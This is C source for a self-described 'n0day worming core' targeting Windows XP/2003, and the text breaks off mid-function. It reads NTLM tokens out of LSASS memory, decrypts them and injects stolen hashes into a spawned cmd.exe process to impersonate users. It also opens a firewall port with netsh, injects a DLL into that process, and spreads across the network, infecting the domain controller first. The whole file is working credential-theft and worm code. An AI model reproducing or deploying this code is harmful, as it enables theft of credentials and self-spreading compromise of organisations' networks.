/*Welcome to the n0day worming core for NT5.0 (XP/2003)!
HL algorithm and details are specified in n0day.product.txt.

lsass_procedure5() is called by thread_dispatcher (threads.c)

Finding NTLM tokens is similar to the NT6.0+ version, BREAK for some offsets.
bcrypt is not implemented in NT5.0, so a custom DESX procedure was hooked in lsasrv.dll to 
decrypt tokens.

Token injection magic numbers are in lsass_procedure5. All tokens are of length 0x70 (except in x64 mode).

Rencryption utilizes LsaEncryptMemory(...)

NT5.0 doesn't support some functions, so i used LogonUser(...) to specify a dummy password and 
CreateProcessAsUser(...) after token manipulation

*/

// Issue in token dups. same session and ntlm hash, different user name, yet a dup is removed


#include "main.h"
#include "globals.h"

// FIXME - memory leak in token deallocation (HeapDestroy)

void (WINAPI *LsaEncryptMemory)(unsigned int *, unsigned int, unsigned int) = NULL;

VOID lsass_procedure5(VOID)
{
	NTLM_TOKEN							*ntlm_tokens[MAX_TOKENS];
	NTLM_TOKEN							real_token;
	NTLM_TOKEN							*ntlm_husk;

	NTSTATUS							ntStatus;

	SECURITY_ATTRIBUTES					security_attributes							= {0};

	PROCESS_INFORMATION					process_info;
	STARTUPINFO							startup_info;

	HANDLE								event_husk_ready							= INVALID_HANDLE_VALUE;
	HANDLE								logon_user									= INVALID_HANDLE_VALUE;
	HANDLE								local_heap									= INVALID_HANDLE_VALUE;
	HANDLE								heap_tmp;

	BYTE								fake_ntlm_pass[16] = NTLM_PASS;
	BYTE								*username_sum_buffer;

	DWORD								*used_token_sums;
	DWORD								injected_tokens[64];
	DWORD								*ptr;

	BOOL								no_targets									= FALSE;
	BOOL								dc_priority									= TRUE;

	BYTE								token_payload[NTLM_TOKEN_5_SIZE];
	BYTE								*ptr2;

	CHAR								output_string[40];

	INT									thread_count, threads[MAX_THREADS];
	INT									i;
	char								b, d;

	struct in_addr						target_address_struct;

	LPCWSTR								dc						= NULL,
										domain					= NULL,
										server					= NULL;
	char								*dc_a					= NULL;
	wchar_t								comp_name[128]			= {0};
	DWORD								comp_name_size			= sizeof(comp_name);
	WSADATA								wsadata					= {0};

	BYTE								*checksum;

	struct	hostent						*host;

	void								(*test)(VOID);

	// Allocate memory - FIXME 
	local_heap			= HeapCreate(0, 0, 0x1000);
	used_token_sums		= (PDWORD)VirtualAlloc(NULL, TOKEN_POOL_SIZE, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	infected_machines	= (PDWORD)VirtualAlloc(NULL, TOKEN_POOL_SIZE, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	//ip_address_list		= (PDWORD)VirtualAlloc(NULL, IP_ADDRESS_LIST_POOL, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	username_sum_buffer	= (PBYTE)VirtualAlloc(NULL, USER_SUM_BUF_SIZE, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	// Find functions - FIXME @CBC should be here too
	//BREAK;
	lsass5_find_lsaencryptmemory(); 

	// Setup event signal
	security_attributes.nLength					= sizeof(SECURITY_ATTRIBUTES);
	security_attributes.bInheritHandle			= TRUE;
	security_attributes.lpSecurityDescriptor	= NULL;
	event_husk_ready							= CreateEventA(&security_attributes, TRUE, FALSE, HUSK_READY_SIGNAL);

	// Create reg key
	create_registry_key(HUSK_KEY_HIVE, HUSK_SUBKEY, HUSK_NAME, HUSK_ERROR_FALSE);

	// Determine IP addy of domain controller
	//WSAStartup(MAKEWORD(2,2), &wsadata);
	//BREAK;
	NetGetDCName(server, domain, (LPBYTE *)&dc);
	dc = (LPCWSTR)((DWORD)dc + 4);

	if (get_unicode_string_length(dc) == 0) {
#ifdef DEBUG_OUT
		DEBUG("+lsass> Failed to obtain PDC hostname!");
		PANIC;
#endif
	}

	dc_a = unicode_to_ascii(dc, get_unicode_string_length(dc));

#ifdef DEBUG_OUT
	DEBUG("+lsass> PDC hostname: %s", dc_a);
#endif

	//BREAK;

	host = gethostbyname(dc_a);	
	if (host == NULL) {
#ifdef DEBUG_OUT
		DEBUG("+lsass> Failed to resolve PDC hostname");
		PANIC;
#endif
	}
	//NetApiBufferFree((LPVOID)((DWORD_PTR)dc - 4));
	//HeapFree(GetProcessHeap(), 0, dc_a);
	//WSACleanup();

	if (dc_address != 0xffffffff) {
		dc_address = *(PDWORD)((PDWORD)(*host->h_addr_list)); // FIXME - expect ipv6 & multiple virtual interfaces 
#ifdef DEBUG_OUT
		DEBUG("+lsass> Primary DC is at 0x%08x. Opening firewall and informing net scan thread...", dc_address);
#endif
	} else {
		dc_address = 0;
#ifdef DEBUG_OUT
		DEBUG("+lsass> We're running on a PDC. Opening firewall and informing net scan thread...", dc_address);
#endif
	}
	Sleep(200);

	// Create tftpd firewall rule
	ZeroMemory((void *)&startup_info, sizeof(STARTUPINFO));
	ZeroMemory((void *)&process_info, sizeof(PROCESS_INFORMATION));
	CreateProcessW(	NULL, 
					L"C:\\windows\\system32\\netsh.exe firewall add portopening UDP 69 \"Windows CFYS Server\"",
					NULL,
					NULL,
					FALSE,
					CREATE_NO_WINDOW,
					NULL,
					NULL,
					&startup_info,
					&process_info);
	//Sleep(5000);

	// Inform scan_net()
	//SetEvent(dc_address_sync_object);

	// Scan the network
	dc_priority = TRUE;

spray_network:
	Sleep(1000);
	//ZeroMemory(ip_address_list, IP_ADDRESS_LIST_POOL);
	//scan_net();

	// Grab IP
	while (TRUE) {

		// Set the used token pool (we want to remove used husks also)
		ZeroMemory(used_token_sums, TOKEN_POOL_SIZE);
		set_memory((PBYTE)used_token_sums, 0x41, 32);

#ifdef DEBUG_OUT
		DEBUG("+lsass> Looking for new target...");
#endif

		// Test our target WMI access FIXME
		//if ((DWORD)*ip_address_list == 0) {
			// No infected machines yet. Attempt to target Global Catalog DC first.
		//} else {
			// We have infected machines already
		ntStatus = 0;
		while (ntStatus == 0) {

			// Do we have a domain controller override?
			if ((dc_address != 0) && (dc_priority == TRUE)) {

				// Test if the DC was infected already
				ptr = infected_machines;
				while (*ptr != 0) {

					if (*ptr == dc_address) {
						break;
					}

					ptr++;
				}

				// DC is prioritized
				if (*ptr == 0) {	

#ifdef DEBUG_OUT
					DEBUG("+lsass> Prioritizing active Domain Controller....");
#endif

					//dc_priority = FALSE;


					target_address_struct.S_un.S_addr = dc_address;
					break;
				}

#ifdef DEBUG_OUT
				else {

					DEBUG("+lsass> PDC Already infected");

				}
#endif
			}

			/*
			// Switch DC priority trigger
			if (dc_address != 0) {
				if (dc_priority == TRUE) {
					dc_priority = FALSE;
				} else {
					dc_priority = TRUE;
				}
			}*/

			ZeroMemory(&target_address_struct, sizeof(struct in_addr));
			Sleep(500);
			//BREAK;
			target_address_struct.S_un.S_addr = get_random_address_from_pool(ip_address_list);

			if (target_address_struct.S_un.S_addr == 0) {
				Sleep(1000);
#ifdef DEBUG_OUT
				DEBUG("+lsass> out of targets, waiting...");
#endif

				dc_priority = TRUE;

				// Signal to zero the used_address_buffer
				zero_used_ip_list = TRUE;

				Sleep(1000);

				goto spray_network;
			}

#ifdef DEBUG_OUT
			DEBUG("+lsass> Testing address 0x%08x ntStatus: 0x%08x", target_address_struct.S_un.S_addr, ntStatus);
#endif
			ntStatus = test_syn_port(135, target_address_struct.S_un.S_addr);

			// Check if the target is already infected
			ptr = infected_machines;
			while (TRUE) {
				if (*ptr == 0) break;

				if (*ptr == target_address_struct.S_un.S_addr) {
					// Already infected
					ntStatus = 0;
					break;
				}
				ptr++;
			}
		}
		//}

#ifdef DEBUG_OUT
		DEBUG("+lsass> Using address 0x%08x", target_address_struct.S_un.S_addr);
#endif

		create_registry_key(TARGET_KEY_HIVE, TARGET_SUBKEY, TARGET_NAME, target_address_struct.S_un.S_addr);

		// Attack target
		while (TRUE) {
			//__nop;
			//BREAK;

			// Grab all existing tokens
			ZeroMemory((void *)ntlm_tokens, sizeof(PNTLM_TOKEN) * MAX_TOKENS);
#ifdef DEBUG_OUT
			DEBUG("+lsass> Enumerating tokens...");
#endif
			find_ntlm_tokens5(ntlm_tokens);

			// Remove token duplicates (checks matching ntlm/session hashes)
			// If this is a husk token, do not remove (check fake ntlm hash)
			//lsass5_remove_dup_tokens(ntlm_tokens); FIXME (obsolete)

			// Remove all used real and husk tokens
#ifdef DEBUG_OUT
			DEBUG("+lsass> Removing duplicate and incorrect tokens");
#endif
			lsass5_remove_used_tokens(used_token_sums, ntlm_tokens);

			// Are we out of tokens?
			if (ntlm_tokens[0] == NULL) {

				// Switch dc_priority
				dc_priority = dc_priority ^ 1;


#ifdef DEBUG_OUT
				DEBUG("+lsass> Out of usable tokens. DC Prioritization is %d", dc_priority);
#endif 


				goto spray_network;
			}

			// Select a real token to impersonate, copy into real_token
			//BREAK;
			ZeroMemory((void *)&real_token, sizeof(NTLM_TOKEN));
			real_token.heap					= HeapCreate(0, 0, 0x100);
			real_token.decrypted_token		= (PDWORD)HeapAlloc(real_token.heap, 0, NTLM_TOKEN_5_SIZE);
			ZeroMemory(real_token.decrypted_token, NTLM_TOKEN_5_SIZE);
			CopyMemory(real_token.decrypted_token, ntlm_tokens[0]->decrypted_token, NTLM_TOKEN_5_SIZE);
			real_token.ntlm					= (PBYTE)((DWORD)real_token.decrypted_token + 32);
			real_token.session				= (PBYTE)((DWORD)real_token.decrypted_token + 16);
			real_token.domain				= (wchar_t *)((DWORD)real_token.decrypted_token + 72);
			real_token.user					= (wchar_t *)(*(PDWORD)((DWORD)real_token.decrypted_token + 12) + (DWORD)real_token.decrypted_token);
			real_token.raw_token			= ntlm_tokens[0]->raw_token;
			real_token.primary_string		= ntlm_tokens[0]->primary_string;



			// Print out target token info
			{
#ifdef DEBUG_OUT
				DEBUGW((wchar_t *)real_token.user);
				DEBUGW((wchar_t *)real_token.domain);

				// NTLM
				ZeroMemory(output_string, sizeof(output_string));
				for (i = 0; i < 16; i++) {
					get_byte_hex(real_token.ntlm[i], &b, &d);

					output_string[i * 2] = b;
					output_string[i * 2 + 1] = d;
				}
				DEBUG(output_string);

				// Session
				ZeroMemory(output_string, sizeof(output_string));
				for (i = 0; i < 16; i++) {
					get_byte_hex(real_token.session[i], &b, &d);

					output_string[i * 2] = b;
					output_string[i * 2 + 1] = d;
				}
				DEBUG(output_string);
#endif
			}

			// Cleanup tokens
			i = 0;
			while (ntlm_tokens[i] != NULL) { 
				HeapFree(ntlm_tokens[i]->heap, 0, ntlm_tokens[i]->decrypted_token);
				heap_tmp = ntlm_tokens[i]->heap;
				HeapFree(ntlm_tokens[i]->heap, 0, ntlm_tokens[i]);
				HeapDestroy(heap_tmp);

				ntlm_tokens[i] = NULL;
				i++;
			}

			// Create husk token
			if (!LogonUser( real_token.user,
							real_token.domain,
							PLAINTEXT_PASS,
							LOGON32_LOGON_NEW_CREDENTIALS,
							LOGON32_PROVIDER_DEFAULT,
							&logon_user)) {
#ifdef DEBUG_OUT
				DEBUG("+lsass> LogonUser failed");
#endif
				Sleep(INFINITE); //FIXME
			}

			// Create process
			ZeroMemory((void *)&startup_info, sizeof(STARTUPINFO));
			ZeroMemory((void *)&process_info, sizeof(PROCESS_INFORMATION));

			if (!CreateProcessAsUser(	logon_user,
										NULL,
										L"C:\\WINDOWS\\system32\\cmd.exe",
										NULL,
										NULL,
										FALSE,
										CREATE_SUSPENDED,
										NULL,
										NULL,
										&startup_info,
										&process_info)) {
#ifdef DEBUG_OUT
				DEBUG("+>lsass CreateProcessAsUser failed");
#endif
				Sleep(INFINITE); //FIXME
			}

#ifdef DEBUG_OUT
			DEBUG("+lsass> Husk started (suspended)");
#endif

			// Grab all existing tokens
			ZeroMemory((void *)ntlm_tokens, sizeof(PNTLM_TOKEN) * MAX_TOKENS);
			find_ntlm_tokens5(ntlm_tokens);

			// Remove token duplicates (checks matching ntlm/session hashes)
			// If this is a husk token, do not remove (check fake ntlm hash)
			//lsass5_remove_dup_tokens(ntlm_tokens);

			// Remove all used real and husk tokens
			lsass5_remove_used_tokens(used_token_sums, ntlm_tokens);

			// Find husk token
			i = 0;
			while (ntlm_tokens[i] != NULL) {
				if (!memory_compare((PDWORD)ntlm_tokens[i]->ntlm, (PDWORD)fake_ntlm_pass, sizeof(fake_ntlm_pass))) {
					break;
				}
				i++;
			}
			ntlm_husk = ntlm_tokens[i];

			// Inject into all husk tokens
			{
				// Zero out token
				ZeroMemory(token_payload, NTLM_TOKEN_5_SIZE);

				// Copy over existing husk token
				CopyMemory(token_payload, ntlm_husk->decrypted_token, NTLM_TOKEN_5_SIZE);

				// Inject hashes
				CopyMemory((void *)((DWORD)token_payload + 32), real_token.ntlm, 16);
				CopyMemory((void *)((DWORD)token_payload + 16), real_token.session, 16);

				// Encrypt token
				LsaEncryptMemory((unsigned int *)token_payload, NTLM_TOKEN_5_SIZE, 1);

				// Stop all lsass threads
				thread_count = 0;
				thread_control(TRUE, threads, (PINT)&thread_count);

				// Inject token
				CopyMemory(ntlm_husk->raw_token, token_payload, NTLM_TOKEN_5_SIZE);

				// Resume all threads
				thread_control(FALSE, threads, (PINT)&thread_count);
			}

			// Resume husk process
			ResumeThread(process_info.hThread);
#ifdef DEBUG_OUT
			DEBUG("+lsass> Husk resumed. Injecting code...");
#endif

			// Inject DLL into husk
			propagate_dll(process_info.dwProcessId, "cmd.exe", "husk_entry_point");
#ifdef DEBUG_OUT
			DEBUG("+lsass> Injected DLL into husk");
#endif
			Sleep(1000);

			// Signal GO & wait for husk to complete
			SetEvent(event_husk_ready);
			Sleep(500);
			WaitForSingleObject(event_husk_ready, INFINITE);
			ResetEvent(event_husk_ready);
			//SuspendThread(process_info.hThread);

			if (read_registry_key(HUSK_KEY_HIVE, HUSK_SUBKEY, HUSK_NAME) == HUSK_ERROR_FALSE) {

				// Husk token SUCCESS
				while (TRUE) {

					if (read_registry_key(HUSK_KEY_HIVE, HUSK_SUBKEY, HUSK_NAME) != HUSK_ERROR_FALSE) {
#ifdef DEBUG_OUT
						DEBUG("!lsass> Husk reported FAILURE!");
#endif
						break;
					}
#ifdef DEBUG_OUT
					DEBUG("+lsass> Husk reported SUCCESS!");
#endif
					Sleep(5000);

					// Set machine as infected
					ptr = infected_machines;
					while (*ptr != 0) {
						ptr++;
					}
					*ptr = target_address_struct.S_un.S_addr;

					// The hash was successful, so try to infect the domain controller again
					if (dc_address != 0) {

						// Test to see if the DC was infected
						ptr = infected_machines;
						while (*ptr != 0) {

							if (*ptr == dc_address) {
								// So the DC is infected, find a new target
								break;
							}

							ptr++;
						}
					}

					// Prioritize the DC
					if ((*ptr == 0) && (dc_address != 0)) {
#ifdef	DEBUG_OUT
						DEBUG("+lsass> Prioritizing functional hash on PDC");
#endif

						create_registry_key(TARGET_KEY_HIVE, TARGET_SUBKEY, TARGET_NAME, dc_address);

						SetEvent(event_husk_ready);
						Sleep(500);
						WaitForSingleObject(event_husk_ready, INFINITE);
						ResetEvent(event_husk_ready);

						if (read_registry_key(HUSK_KEY_HIVE, HUSK_SUBKEY, HUSK_NAME) != HUSK_ERROR_FALSE) {

							// Failure in attacking DC

#ifdef DEBUG_OUT
							DEBUG("!lsass> Husk reported FAILURE (DC)!");

#endif

							dc_priority = FALSE;

							//continue;
						} else {

							// Success in attacking DC

#ifdef DEBUG_OUT
							DEBUG("+lsass> Husk reported SUCCESS (DC)!");
#endif					
						
							// Set DC as infected
							ptr = infected_machines;
							while (*ptr != 0) {
								ptr++;
							}

							*ptr		= dc_address;
							dc_address	= 0;
							dc_priority = FALSE;

							// The hash worked on teh DC, so proceed to spraying the network
						}

					}

					// Find new target
					ntStatus = 0;
					while (ntStatus == 0) {
#ifdef DEBUG_OUT
						DEBUG("+lsass> Looking for new target...");
#endif
						ZeroMemory(&target_address_struct, sizeof(struct in_addr));
						target_address_struct.S_un.S_addr = get_random_address_from_pool(ip_address_list);

						if (target_address_struct.S_un.S_addr == 0) {
							Sleep(500);
#ifdef DEBUG_OUT
							DEBUG("+lsass> out of targets (reuse hash), getting more targets...");
#endif

							// Signal to zero the used_address_buffer
							zero_used_ip_list = TRUE;
							Sleep(5000);

							// Attempt to get a new address
							ZeroMemory(&target_address_struct, sizeof(struct in_addr));
							target_address_struct.S_un.S_addr = get_random_address_from_pool(ip_address_list);

							// Test if we have an address
							if (target_address_struct.S_un.S_addr == 0) {

								// No address found, get out of the loop
								no_targets = TRUE;
								goto term_proc;
							}
						}

						ntStatus = test_syn_port(135, target_address_struct.S_un.S_addr);

						// Check if the target is already infected
						ptr = infected_machines;
						while (TRUE) {
							if (*ptr == 0) break;

							if (*ptr == target_address_struct.S_un.S_addr) {
								// Already infected
								ntStatus = 0;
								break;
							}
							ptr++;
						}
					}

#ifdef DEBUG_OUT
					DEBUG("+lsass> Using address 0x%08x (reuse)", target_address_struct.S_un.S_addr);
#endif

					create_registry_key(TARGET_KEY_HIVE, TARGET_SUBKEY, TARGET_NAME, target_address_struct.S_un.S_addr);

					SetEvent(event_husk_ready);
					Sleep(500);
					WaitForSingleObject(event_husk_ready, INFINITE);
					ResetEvent(event_husk_ready);
				}

			} else {
				// Husk token FAILURE
				Sleep(1000); 
#ifdef DEBUG_OUT
				DEBUG("!lsass> Husk reported FAILURE!");
#endif
			}

term_proc:
			// Kill the husk process
			TerminateProcess(process_info.hProcess, 0);

			// Inject placeholder into used husk tokens
			{
				// Zero out token
				ZeroMemory(token_payload, NTLM_TOKEN_5_SIZE);

				// Copy over existing husk token
				CopyMemory(token_payload, ntlm_husk->decrypted_token, NTLM_TOKEN_5_SIZE);

				// Inject 0x41
				set_memory((PBYTE)((DWORD)token_payload + 16), 0x41, 32);

				// Encrypt token
				LsaEncryptMemory((unsigned int *)token_payload, NTLM_TOKEN_5_SIZE, 1);

				// Stop all lsass threads
				thread_count = 0;
				thread_control(TRUE, threads, (PINT)&thread_count);

				// Inject token
				CopyMemory(ntlm_husk->raw_token, token_payload, NTLM_TOKEN_5_SIZE);

				// Resume all threads
				thread_control(FALSE, threads, (PINT)&thread_count);
			}

			// Set real_token as used
			ptr = used_token_sums;
			while ((*ptr != 0) && (*(PDWORD)((DWORD)ptr + 16) != 0)) {
				ptr = (PDWORD)((DWORD)ptr + 32);
			}
			CopyMemory(ptr, (void *)real_token.session, 32);

			// Generate username sum
			//checksum = (PBYTE)generate_sha1((PDWORD)real_token.user_name, (unsigned int)get_unicode_string_length(real_token.user_name));

			/*
#ifdef DEBUG_OUT
			DEBUG("+lsass> Username sum: 0x%08x", checksum);
#endif

			// Append sum 
			ptr2 = (PBYTE)username_sum_buffer;
			while (*(PDWORD)ptr2 != 0) {
				ptr2 = (PBYTE)((DWORD)ptr2 + 4);
			}
			*/

			//dc_priority = TRUE;

			// Free real_token
			HeapFree(real_token.heap, 0, real_token.decrypted_token);
			HeapDestroy(real_token.heap);
			
			// Cleanup tokens
			i = 0;
			while (ntlm_tokens[i] != NULL) { 
				HeapFree(ntlm_tokens[i]->heap, 0, ntlm_tokens[i]->decrypted_token);
				heap_tmp = ntlm_tokens[i]->heap;
				HeapFree(ntlm_tokens[i]->heap, 0, ntlm_tokens[i]);
				HeapDestroy(heap_tmp);

				ntlm_tokens[i] = NULL;
				i++;
			}

			if (no_targets == TRUE) {
				no_targets = FALSE; 
				
				goto spray_network;
			}
		}
	}
}

VOID find_ntlm_tokens5(PNTLM_TOKEN token_structure[MAX_TOKENS])
{
	char							token_string[]					= { 'P', 'r', 'i', 'm', 'a', 'r', 'y', '\0' };
	MEMORY_BASIC_INFORMATION		memory_basic_information;
	BYTE							*page							= NULL;
	BYTE							*ptr;
	int								i, token_structure_counter		= 0;

	//BREAK;

	while ((unsigned int)page < 0x7fffffff) { // fIXME
		ZeroMemory((void *)&memory_basic_information, sizeof(MEMORY_BASIC_INFORMATION));
		if (!VirtualQuery(page, &memory_basic_information, sizeof(MEMORY_BASIC_INFORMATION))) {
			break;
		}

		if ((!memory_basic_information.State == MEM_COMMIT) || (memory_basic_information.Type != MEM_PRIVATE)) {
			page = (PBYTE)((DWORD)page + 0x1000);
			continue;
		}

		ptr = page;
		while (!IsBadReadPtr(ptr, sizeof(token_string))) {

			if ((DWORD)ptr == (DWORD)((DWORD)page + 0x1000)) {
				break;
			}

			if (IsBadReadPtr((void *)((DWORD)ptr - 12), sizeof(token_string))) {
				ptr++;
				continue;
			}

			if (memory_compare((PDWORD)ptr, (PDWORD)token_string, sizeof(token_string))) {
				ptr++;
				continue;
			}

			if ((DWORD)(*(DWORD *)((DWORD)ptr - 12)) != (DWORD)ptr) {
				ptr++; 
				continue;
			}

			//DEBUG("+lsass> Primary string @ 0x%08x 0x%08x 0x%08x", ptr, memory_basic_information.BaseAddress, memory_basic_information.RegionSize);

			//DEBUG("+lsass> Extracting token");
#ifdef DEBUG_OUT
			DEBUG("+lsass> Decrypting token");
#endif
			token_structure[token_structure_counter] = lsass5_extract_token((PDWORD)ptr);

			if (token_structure[token_structure_counter] == NULL) {

#ifdef DEBUG_OUT
				DEBUG("+lsass> Invalid NULL token excluded.");
#endif
				ptr++;

				continue;
			}

			token_structure_counter++;

			ptr++;
		}

		page = (PBYTE)((DWORD)page + 0x1000);
	}

	return;
}

PNTLM_TOKEN lsass5_extract_token(PDWORD token)
{
	HANDLE						heap;
	NTLM_TOKEN					*ntlm_token;

	char						output_string[256];
	char						b, d;

	unsigned int				i;

	heap						= HeapCreate(0, 0, 0x1000);
	ntlm_token					= (PNTLM_TOKEN)HeapAlloc(heap, 0, sizeof(NTLM_TOKEN));

	// Prepare token
	ZeroMemory((void *)ntlm_token, sizeof(NTLM_TOKEN));
	ntlm_token->heap			= heap;
	ntlm_token->decrypted_token	= (PDWORD)HeapAlloc(ntlm_token->heap, 0, NTLM_TOKEN_5_SIZE);
	ZeroMemory(ntlm_token->decrypted_token, NTLM_TOKEN_5_SIZE);
	ntlm_token->primary_string	= (char *)token;
	ntlm_token->raw_token		= (PDWORD)((DWORD)token + 8);

	// Copy encrypted token to new buffer
	CopyMemory(ntlm_token->decrypted_token, ntlm_token->raw_token, NTLM_TOKEN_5_SIZE);

	// Decrypt token
	LsaEncryptMemory((unsigned int *)ntlm_token->decrypted_token, NTLM_TOKEN_5_SIZE, 0);

	//DEBUG("Decrypted token: 0x%08x", ntlm_token->decrypted_token);

	// Set token pointers
	ntlm_token->ntlm		= (PBYTE)((DWORD)ntlm_token->decrypted_token + 32);
	ntlm_token->session		= (PBYTE)((DWORD)ntlm_token->decrypted_token + 16);
	ntlm_token->domain		= (wchar_t *)((DWORD)ntlm_token->decrypted_token + 72);
	ntlm_token->user		= (wchar_t *)(*(PDWORD)((DWORD)ntlm_token->decrypted_token + 12) + (DWORD)ntlm_token->decrypted_token);
	
	// Print out token info
#ifdef DEBUG_OUT
#ifdef DEBUG_PRINT_ALL_TOKENS
	DEBUG("+lsass> Token Information:");

	// Print out user
	DEBUGW(ntlm_token->user);
	DEBUGW(ntlm_token->domain);

	// NTLM
	ZeroMemory(output_string, sizeof(output_string));
	for (i = 0; i < 16; i++) {
		get_byte_hex(ntlm_token->ntlm[i], &b, &d);

		output_string[i * 2] = b;
		output_string[i * 2 + 1] = d;
	}
	DEBUG(output_string);

	// Session
	ZeroMemory(output_string, sizeof(output_string));
	for (i = 0; i < 16; i++) {
		get_byte_hex(ntlm_token->session[i], &b, &d);

		output_string[i * 2] = b;
		output_string[i * 2 + 1] = d;
	}
	DEBUG(output_string);
#endif
#endif

	// Check if the token is a NULL session
	for (i = 0; i < NTLM_SESSION_LENGTH; i++) {
		if (*(PBYTE)((DWORD)ntlm_token->ntlm + (DWORD)i)) {
			break;
		}
	}

	//DEBUG("+lsass> .");
	if (i == NTLM_SESSION_LENGTH) {

		HeapFree(ntlm_token->heap,	0, ntlm_token->decrypted_token);
		HeapDestroy(ntlm_token->heap);

		return (PNTLM_TOKEN)NULL;
	}

	return ntlm_token;
}


VOID lsass5_find_cbc(VOID)
{
	char		*ptr;
	HMODULE		lsasrv;
	DWORD		build				= 0;
	/*

	// old testing environment
	BYTE		cbc_sig[] = {	0x8b, 0xff, 
								0x55,
								0x8b, 0xec,
								0x6a, 0x00,
								0xff, 0x75, 0x0c,
								0xff, 0x75, 0x08,
								0xe8, 0x3f, 0xfe, 0xff, 0xff,
								0x5d,
								0xc2, 0x08, 0x00 };
								*/

	// winxp sp3
	
	BYTE		cbc_sig[] = {	0x8b, 0xff,
								0x55,
								0x8b, 0xec,
								0x56,
								0x8b, 0x75, 0x0c,
								0x57,
								0x8b, 0x7d, 0x10,
								0x57,
								0x8d, 0x04, 0xf5, 0x00, 0x04, 0x7d, 0x75};
	

	//BYTE		cbc_sig[128];
/*
757AD603   8BFF             MOV EDI,EDI
757AD605   55               PUSH EBP
757AD606   8BEC             MOV EBP,ESP
757AD608   56               PUSH ESI
757AD609   8B75 0C          MOV ESI,DWORD PTR SS:[EBP+C]
757AD60C   57               PUSH EDI
757AD60D   8B7D 10          MOV EDI,DWORD PTR SS:[EBP+10]
757AD610   57               PUSH EDI
757AD611   8D04F5 00047D75  LEA EAX,DWORD PTR DS:[ESI*8+757D0400]
*/

	// Get the OS build
	//build = GetVersion();

	// Get lsasrv base
	lsasrv = GetModuleHandleA("lsasrv.dll");

	// Locate our target function signature
	/*
	7573FF9B    8BFF            MOV EDI,EDI
	7573FF9D    55              PUSH EBP
	7573FF9E    8BEC            MOV EBP,ESP
	7573FFA0    6A 00           PUSH 0
	7573FFA2    FF75 0C         PUSH DWORD PTR SS:[EBP+C]
	7573FFA5    FF75 08         PUSH DWORD PTR SS:[EBP+8]
	7573FFA8    E8 3FFEFFFF     CALL LSASRV.7573FDEC
	7573FFAD    5D              POP EBP
	7573FFAE    C2 0800         RETN 8
	*/
	ptr = (char *)lsasrv;
	while (TRUE) {
		if (!memory_compare((PDWORD)ptr, (PDWORD)cbc_sig, sizeof(cbc_sig))) {
			break;
		}
		ptr++;
	}

	//cbc_function = (int (WINAPI*)(char *, unsigned int))ptr;
	//DEBUG("Found cbc_function @ 0x%08x", ptr);

	return;
}

VOID lsass5_find_lsaencryptmemory(VOID) 
{
	OSVERSIONINFOA		version_info;

	char		*ptr;
	HMODULE		lsasrv;

	/*
	BYTE		cbc_sig[] = {	0x8b, 0xff,
								0x55,
								0x8b, 0xec,
								0x81, 0xec, 0x10, 0x01, 0x00, 0x00,
								0xa1, 0x58, 0x01, 0x7d, 0x75,
								0x56,
								0x8b, 0x75, 0x08,
								0x85, 0xf6,
								0x89, 0x45, 0xfc };
								*/

	BYTE					sig_0[] = LSA_SIG_XP;
	BYTE					sig_1[]	= {0};
	BYTE					sig_2[]	= LSA_SIG_XP_SP2;
	BYTE					sig_3[]	= LSA_SIG_XP_SP3;


	// Get Service pack
	ZeroMemory((void *)&version_info, sizeof(OSVERSIONINFOA));
	version_info.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
	GetVersionExA(&version_info);

	lsasrv = GetModuleHandleA("lsasrv.dll");
	ptr = (char *)lsasrv;

	if (!string_compare(SP3_STRING, version_info.szCSDVersion, string_length(version_info.szCSDVersion))) {
		// Service pack 3
#ifdef DEBUG_OUT
		DEBUG("+lsass> XP Service Pack 3 Found.");
#endif

		while (TRUE) {
			if (!memory_compare((PDWORD)ptr, (PDWORD)sig_3, sizeof(sig_3))) {
				break;
			}
			ptr++;
		}

	} else if (!string_compare(SP2_STRING, version_info.szCSDVersion, string_length(version_info.szCSDVersion))) {
		// Service pack 2
#ifdef DEBUG_OUT
		DEBUG("+lsass> XP Service Pack 2 Found");
#endif

		while (TRUE) {
			if (!memory_compare((PDWORD)ptr, (PDWORD)sig_2, sizeof(sig_2))) {
				break;
			}
			ptr++;
		}

	} else if (!string_compare(SP1_STRING, version_info.szCSDVersion, string_length(version_info.szCSDVersion))) {
		// Service pack 1
#ifdef DEBUG_OUT
		DEBUG("+lsass> XP Service Pack 1 Found - Unsupported.");
#endif

		BREAK;

		while (TRUE) {
			if (!memory_compare((PDWORD)ptr, (PDWORD)sig_1, sizeof(sig_1))) {
				break;
			}
			ptr++;
		}

	} else if (*(unsigned char *)version_info.szCSDVersion == 0) {
		// Service pack 0
#ifdef DEBUG_OUT
		DEBUG("+lsass> XP Service Pack 0 Found - Unsupported.");
#endif
		BREAK;

		while (TRUE) {
			if (!memory_compare((PDWORD)ptr, (PDWORD)sig_0, sizeof(sig_0))) {
				break;
			}
			ptr++;
		}
	} else {
		// Error - FIXME
#ifdef DEBUG_OUT
		DEBUG("+lsass> Error in determining LsaEncryptMemory function. Halting all threads");
#endif


		BREAK;
	}

	/*
.text:75745751 8B FF                      mov     edi, edi
.text:75745753 55                         push    ebp
.text:75745754 8B EC                      mov     ebp, esp
.text:75745756 81 EC 10 01 00 00          sub     esp, 110h       ; Integer Subtraction
.text:7574575C A1 58 F1 7C 75             mov     eax, ___security_cookie
.text:75745761 56                         push    esi
.text:75745762 8B 75 08                   mov     esi, [ebp+arg_0]
.text:75745765 85 F6                      test    esi, esi        ; Logical Compare
.text:75745767 89 45 FC                   mov     [ebp+var_4],
*/
	// Get our service pack
	/*
	GetVersionExW(version_info);

#ifdef DEBUG_OUT
	DEBUGW(version_info->szCSDVersion);
#endif

	Sleep(500);
	BREAK; */

	/*
	if (!string_compare(SP3_STRING, version_info.szCSDVersion, string_length(SP3_STRING))) {
		// Service pack 3
#ifdef DEBUG_OUT
		DEBUG("+lsass> Service Pack 3 Found.");
#endif


	} else if (!string_compare(SP2_STRING, version_info.szCSDVersion, string_length(SP2_STRING))) {
		// Service pack 2
#ifdef DEBUG_OUT
		DEBUG("+lsass> Service Pack 2 Found.");
#endif


	} else if (!string_compare(SP1_STRING, version_info.szCSDVersion, string_length(SP1_STRING))) {
		// Service pack 1
#ifdef DEBUG_OUT
		DEBUG("+lsass> Service Pack 1 Found.");
#endif



	} else if (*(unsigned char *)version_info.szCSDVersion == 0) {
		// Service pack 0
#ifdef DEBUG_OUT
